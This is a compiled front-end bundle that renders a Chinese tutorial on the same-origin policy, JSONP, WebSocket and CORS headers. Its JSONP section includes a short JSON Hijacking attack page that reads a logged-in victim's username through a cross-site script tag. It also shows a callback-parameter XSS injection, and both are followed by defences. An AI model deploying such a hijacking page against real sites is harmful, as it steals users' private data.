(window.webpackJsonp=window.webpackJsonp||[]).push([[79],{744:function(t,s,a){"use strict";a.r(s);var n=a(103),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h2",{attrs:{id:"同源策略"}},[t._v("同源策略 "),a("a",{staticClass:"header-anchor",attrs:{href:"#同源策略"}},[t._v("#")])]),t._v(" "),a("p",[t._v("同源策略是目前所有浏览器都实行的一种安全政策。")]),t._v(" "),a("p",[t._v("A网页设置的 Cookie，B网页不能打开，除非这两个网页同源。")]),t._v(" "),a("p",[t._v("所谓同源，是指：")]),t._v(" "),a("p",[a("strong",[t._v("两个网页，协议(protocol)、端口(port)、和主机(host)都相同.")])]),t._v(" "),a("p",[t._v("如果非同源，以下三种行为受到限制：")]),t._v(" "),a("blockquote",[a("p",[t._v("（1） Cookie、"),a("code",[t._v("LocalStorage")]),t._v(" 和 "),a("code",[t._v("IndexDB")]),t._v(" 无法读取。")]),t._v(" "),a("p",[t._v("（2） DOM 无法获得。")]),t._v(" "),a("p",[t._v("（3） AJAX 请求不能发送。")])]),t._v(" "),a("p",[a("strong",[t._v("同源策略，哪些东西是同源可以获取到的？")])]),t._v(" "),a("blockquote",[a("p",[a("code",[t._v("cookie：")]),t._v(" 服务器写入浏览器的一小段信息，只有同源的网页才能共享")]),t._v(" "),a("p",[a("code",[t._v("DOM：")]),t._v(" \t如果两个网页不同源，就无法拿到对方的DOM ； 典型的例子是"),a("code",[t._v("iframe")]),t._v("窗口和"),a("code",[t._v("window.open")]),t._v("方法打开的窗口，它们与父窗口无法通信")])]),t._v(" "),a("p",[a("strong",[t._v("如果子域名和顶级域名不同源，在哪里可以设置叫他们同源？")])]),t._v(" "),a("p",[t._v("两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置"),a("code",[t._v("document.domain")]),t._v("属性共享 Cookie，拿到DOM等。")]),t._v(" "),a("p",[t._v("在根域范围内，可以 把domain属性的值设置为它的上一级域 ；")]),t._v(" "),a("div",{staticClass:"language-js line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 对于文档 www.example.com/good.html,")]),t._v("\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("domain "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"example.com"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" domain "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("domain"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//上边的写法是正确的")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//但不能设置为 "example.com" 或者"example.org"')]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br")])]),a("p",[a("strong",[t._v("Ajax是否遵循同源策略？")])]),t._v(" "),a("p",[t._v("同源政策规定，AJAX请求只能发给同源的网址，否则就报错")]),t._v(" "),a("p",[a("strong",[t._v("不同浏览器之间，安全策略有哪些不同？比如chrome，firefox，IE")])]),t._v(" "),a("p",[t._v("当涉及到同源策略时，Internet Explorer 有两个主要的不同点")]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("授信范围")]),t._v("（Trust Zones）：两个相互之间高度互信的域名，如公司域名（corporate domains），不遵守同源策略的限制。")]),t._v(" "),a("li",[a("strong",[t._v("端口")]),t._v("：IE 未将端口号加入到同源策略的组成部分之中，")]),t._v(" "),a("li",[t._v("因此 "),a("code",[t._v("http://company.com:81/index.html")]),t._v(" 和 "),a("code",[t._v("http://company.com/index.html")]),t._v("  属于同源并且不受任何限制")])]),t._v(" "),a("p",[a("strong",[t._v("如何规避同源策略？")])]),t._v(" "),a("blockquote",[a("ul",[a("li",[t._v("以下三种方法可以规避同源策略的限制")]),t._v(" "),a("li",[t._v("JSONP")]),t._v(" "),a("li",[t._v("CORS")]),t._v(" "),a("li",[t._v("WebSocket")])])]),t._v(" "),a("h2",{attrs:{id:"jsonp"}},[t._v("JSONP "),a("a",{staticClass:"header-anchor",attrs:{href:"#jsonp"}},[t._v("#")])]),t._v(" "),a("p",[a("code",[t._v("JSONP")]),t._v("是服务器与客户端跨源通信的常用方法")]),t._v(" "),a("p",[a("code",[t._v("JSON with Padding")]),t._v("，填充式"),a("code",[t._v("JSON")]),t._v("或者说是参数式"),a("code",[t._v("JSON")])]),t._v(" "),a("p",[a("code",[t._v("JSONP")]),t._v("原理就是动态插入带有"),a("code",[t._v("跨域url")]),t._v("的"),a("code",[t._v("<script>")]),t._v("标签，然后调用回调函数")]),t._v(" "),a("p",[a("strong",[t._v("基本语法如下")]),t._v("：")]),t._v(" "),a("div",{staticClass:"language-json line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-json"}},[a("code",[t._v("callback("),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"name"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"wintrysec"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"msg"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"获取成功"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(");\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[a("strong",[a("code",[t._v("JSONP")]),t._v("两部分组成：回调函数和里面的数据。")]),t._v("\n回调函数是当响应到来时，应该在页面中调用的函数，一般是在发送过去的请求中指定")]),t._v(" "),a("p",[t._v("向服务器请求"),a("code",[t._v("JSON")]),t._v("数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("addScriptTag")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" script "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("createElement")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'script'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  script"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("setAttribute")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"text/javascript"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  script"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" src"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("appendChild")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\nwindow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function-variable function"}},[t._v("onload")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("addScriptTag")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://example.com/ip?callback=foo'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("foo")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("data")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  console"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Your public IP address is: '")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ip"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br"),a("span",{staticClass:"line-number"},[t._v("15")]),a("br")])]),a("p",[t._v("服务器收到这个请求以后，会将数据放在回调函数的参数位置返回")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("foo")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ip"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"8.8.8.8"')]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[t._v("由于"),a("code",[t._v("<script>")]),t._v("元素请求的脚本，直接作为代码运行。")]),t._v(" "),a("p",[t._v("这时，只要浏览器定义了"),a("code",[t._v("foo")]),t._v("函数，该函数就会立即调用。")]),t._v(" "),a("p",[t._v("作为参数的"),a("code",[t._v("JSON")]),t._v("数据被视为JavaScript对象，而不是字符串，因此避免了使用"),a("code",[t._v("JSON.parse")]),t._v("的步骤")]),t._v(" "),a("h3",{attrs:{id:"jsonp的劫持"}},[t._v("JSONP的劫持 "),a("a",{staticClass:"header-anchor",attrs:{href:"#jsonp的劫持"}},[t._v("#")])]),t._v(" "),a("p",[a("code",[t._v("JSON")]),t._v(" 劫持又为 "),a("code",[t._v("JSON Hijacking")]),t._v(" ，这个问题属于 "),a("code",[t._v("CSRF")]),t._v(" 攻击范畴。\n当某网站通过 "),a("code",[t._v("JSONP")]),t._v(" 的方式来跨域（一般为子域）传递用户认证后的敏感信息时\n攻击者可以构造恶意的 "),a("code",[t._v("JSONP")]),t._v(" 调用页面，诱导被攻击者访问，来达到截取用户敏感信息的目的")]),t._v(" "),a("p",[t._v("一个典型的 "),a("code",[t._v("JSON Hijacking")]),t._v(" 攻击代码("),a("code",[t._v("wooyun")]),t._v(")：")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("wooyun")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("v")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n   "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("v"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http:/xx.cn/?o=sso&m=info&func=wooyun"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br")])]),a("p",[t._v("当被攻击者在登陆 360 网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持")]),t._v(" "),a("h3",{attrs:{id:"jsonp防御"}},[t._v("JSONP防御 "),a("a",{staticClass:"header-anchor",attrs:{href:"#jsonp防御"}},[t._v("#")])]),t._v(" "),a("p",[a("strong",[t._v("1. 验证 "),a("code",[t._v("JSON")]),t._v(" 文件调用的来源 "),a("code",[t._v("Referer")])])]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" 远程加载 "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("JSON")]),t._v(" 文件时会发送 Referer \n 在网站输出 "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("JSON")]),t._v(" 数据时判断 Referer 是不是白名单合法的，就可以进行防御\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[a("strong",[t._v("2.随机 token")])]),t._v(" "),a("p",[t._v("存在reference伪造(qq.com.evil.com)、空reference、暴力穷举等问题")]),t._v(" "),a("p",[a("a",{attrs:{href:"https://www.cnblogs.com/subsir/articles/2574670.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("强大的PHP伪造IP头、Cookies、Reference"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("最有效的方式还是 综合防御(判断reference和添加随机字串)，或使用加在"),a("code",[t._v("url")]),t._v("中的token可以完美解决\n但是只要在该网站上出现一个 "),a("code",[t._v("XSS")]),t._v(" 漏洞，那么利用这个 "),a("code",[t._v("XSS")]),t._v(" 漏洞可能让你的防御体系瞬间崩溃")]),t._v(" "),a("p",[a("strong",[t._v("3."),a("code",[t._v("callback")]),t._v("函数可定义的安全问题")]),t._v("\ncallback函数的名称可以自定义，而输出环境又是"),a("code",[t._v("js")]),t._v("环境，如果没有严格过滤或审查，可以引起很多其他的攻击方式。")]),t._v(" "),a("p",[t._v("比如后台使用"),a("code",[t._v("$callback = $_GET['callback'];print $callback.(data);")]),t._v("\n这样子，认为callback是可信的，而攻击者完全可以将"),a("code",[t._v("alert(/xss/)")]),t._v("作为callback参数传递进去。")]),t._v(" "),a("p",[a("strong",[t._v("这种问题有两种解决方案：")])]),t._v(" "),a("p",[a("strong",[t._v("(1) 严格定义 "),a("code",[t._v("Content-Type: application / json")])]),t._v("\n这样的防御机制导致了浏览器不解析恶意插入的 "),a("code",[t._v("XSS")]),t._v(" 代码")]),t._v(" "),a("p",[a("strong",[t._v("(2 )过滤 callback 以及 "),a("code",[t._v("JSON")]),t._v(" 数据输出")]),t._v("\n这样的防御机制是比较传统的攻防思维，对输出点进行 "),a("code",[t._v("xss")]),t._v(" 过滤")]),t._v(" "),a("h2",{attrs:{id:"websocket"}},[t._v("WebSocket "),a("a",{staticClass:"header-anchor",attrs:{href:"#websocket"}},[t._v("#")])]),t._v(" "),a("p",[a("code",[t._v("WebSocket")]),t._v("是一种通信协议，使用"),a("code",[t._v("ws://")]),t._v("（非加密）和"),a("code",[t._v("wss://")]),t._v("（加密）作为协议前缀。")]),t._v(" "),a("p",[t._v("该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。")]),t._v(" "),a("p",[a("strong",[t._v("为什么？")])]),t._v(" "),a("p",[a("code",[t._v("WebSocket")]),t._v("请求的头信息中有一个字段是"),a("code",[t._v("Origin")]),t._v("，表示该请求的请求源（origin），即发自哪个域名。")]),t._v(" "),a("p",[t._v("正是因为有了"),a("code",[t._v("Origin")]),t._v("这个字段，所以"),a("code",[t._v("WebSocket")]),t._v("才没有实行同源政策。")]),t._v(" "),a("p",[t._v("因为服务器可以根据这个字段，判断是否许可本次通信。")]),t._v(" "),a("h2",{attrs:{id:"cors-重点"}},[t._v("CORS(重点) "),a("a",{staticClass:"header-anchor",attrs:{href:"#cors-重点"}},[t._v("#")])]),t._v(" "),a("p",[a("code",[t._v("CORS")]),t._v("是跨域资源共享（Cross-Origin Resource Sharing）的缩写。")]),t._v(" "),a("p",[t._v("它允许浏览器向跨源服务器，发出"),a("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html",target:"_blank",rel:"noopener noreferrer"}},[a("code",[t._v("XMLHttpRequest")]),a("OutboundLink")],1),t._v("请求，从而克服了AJAX只能"),a("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("同源"),a("OutboundLink")],1),t._v("使用的限制")]),t._v(" "),a("p",[t._v("它是"),a("code",[t._v("W3C")]),t._v("标准，是跨源AJAX请求的根本解决方法。")]),t._v(" "),a("p",[a("code",[t._v("CORS")]),t._v("请求大致和"),a("code",[t._v("ajax")]),t._v("请求类似，但是在HTTP头信息中加上了Origin字段表明请求来自哪个源。")]),t._v(" "),a("p",[t._v("如果"),a("code",[t._v("orgin")]),t._v("是许可范围之内的话，服务器返回的响应会多出"),a("code",[t._v("Access-Control-Allow-*")]),t._v("的字段")]),t._v(" "),a("h3",{attrs:{id:"简单请求"}},[t._v("简单请求 "),a("a",{staticClass:"header-anchor",attrs:{href:"#简单请求"}},[t._v("#")])]),t._v(" "),a("p",[t._v("只要同时满足以下两大条件，就属于简单请求。\n"),a("strong",[t._v("(1) 请求方法是以下三种方法之一")])]),t._v(" "),a("blockquote",[a("p",[t._v("HEAD")]),t._v(" "),a("p",[t._v("GET")]),t._v(" "),a("p",[t._v("POST")])]),t._v(" "),a("p",[a("strong",[t._v("(2) HTTP的头信息不超出以下几种字段：")])]),t._v(" "),a("blockquote",[a("p",[t._v("Accept")]),t._v(" "),a("p",[t._v("Accept-Language")]),t._v(" "),a("p",[t._v("Content-Language")]),t._v(" "),a("p",[t._v("Last-Event-ID")]),t._v(" "),a("p",[t._v("Content-Type：只限于三个值 "),a("code",[t._v("application/x-www-form-urlencoded")]),t._v("、"),a("code",[t._v("multipart/form-data")]),t._v("、"),a("code",[t._v("text/plain")])])]),t._v(" "),a("p",[t._v("浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段")]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token request-line"}},[a("span",{pre:!0,attrs:{class:"token property"}},[t._v("GET")]),t._v(" /cors HTTP/1.1")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Origin:")]),t._v(" http://api.b.com\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Host:")]),t._v(" api.a.com\n\nOrigin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）\n服务器根据这个值，决定是否同意这次请求\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br")])]),a("p",[t._v("简单请求有三个重要的响应头")]),t._v(" "),a("p",[a("strong",[t._v("(1) Access-Control-Allow-Origin")])]),t._v(" "),a("p",[t._v("该字段是必须的,它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求")]),t._v(" "),a("p",[a("strong",[t._v("(2)Access-Control-Allow-Credentials")])]),t._v(" "),a("p",[t._v("该字段可选,它的值是一个布尔值，表示是否允许发送Cookie。")]),t._v(" "),a("p",[t._v("默认情况下，Cookie不包括在"),a("code",[t._v("CORS")]),t._v("请求之中。")]),t._v(" "),a("p",[t._v("设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。")]),t._v(" "),a("p",[t._v("这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可")]),t._v(" "),a("p",[a("strong",[t._v("(3) Access-Control-Expose-Headers")])]),t._v(" "),a("p",[t._v("该字段可选，"),a("code",[t._v("CORS")]),t._v("请求时，"),a("code",[t._v("XMLHttpRequest")]),t._v("对象的"),a("code",[t._v("getResponseHeader()")]),t._v("方法只能拿到6个基本字段：")]),t._v(" "),a("p",[a("code",[t._v("Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma")]),t._v("。")]),t._v(" "),a("p",[t._v("如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。")]),t._v(" "),a("p",[t._v("例如，"),a("code",[t._v("getResponseHeader('wintrysec')")]),t._v("可以返回"),a("code",[t._v("wintrysec")]),t._v("字段的值")]),t._v(" "),a("p",[a("strong",[t._v("响应字段，可请求资源范围")])]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[t._v("Access-Control-Allow-Origin：*  //表示同意任意跨源请求\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h3",{attrs:{id:"非简单请求"}},[t._v("非简单请求 "),a("a",{staticClass:"header-anchor",attrs:{href:"#非简单请求"}},[t._v("#")])]),t._v(" "),a("blockquote",[a("p",[t._v("即对服务器有特殊要求的请求，比如PUT方法，自定义HTTP-HEAD头部等")]),t._v(" "),a("p",[t._v('非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求')]),t._v(" "),a("p",[t._v('"预检"请求用OPTIONS方法询问服务器允许的方法')])]),t._v(" "),a("p",[t._v('"预检"请求的头信息包括两个特殊字段。\n'),a("strong",[t._v("(1)Access-Control-Request-Method")]),t._v("\n该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法.\n"),a("strong",[t._v("(2)Access-Control-Request-Headers")]),t._v("\n指定浏览器"),a("code",[t._v("CORS")]),t._v("请求会额外发送的"),a("code",[t._v("http")]),t._v("头部信息字段，多个字段用逗号分隔")]),t._v(" "),a("p",[t._v('如果浏览器否定了"预检"请求，会返回一个正常的HTTP回应，但是没有任何'),a("code",[t._v("CORS")]),t._v("相关的头信息字段响应")]),t._v(" "),a("p",[t._v("服务器响应的其他"),a("code",[t._v("CORS")]),t._v("相关字段如下：")]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Access-Control-Allow-Methods:")]),t._v(" GET, POST, PUT\t\t//服务器支持的所有跨域请求的方法\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Access-Control-Allow-Headers:")]),t._v(" X-Custom-Header\t\t//服务器支持的所有头信息字段\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Access-Control-Allow-Credentials:")]),t._v(" true\t\t\t\t//表示是否允许发送Cookie\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Access-Control-Max-Age:")]),t._v(" 1728000\t\t\t\t\t\t//用来指定本次预检请求的有效期，单位为秒\n")])]),t._v(" 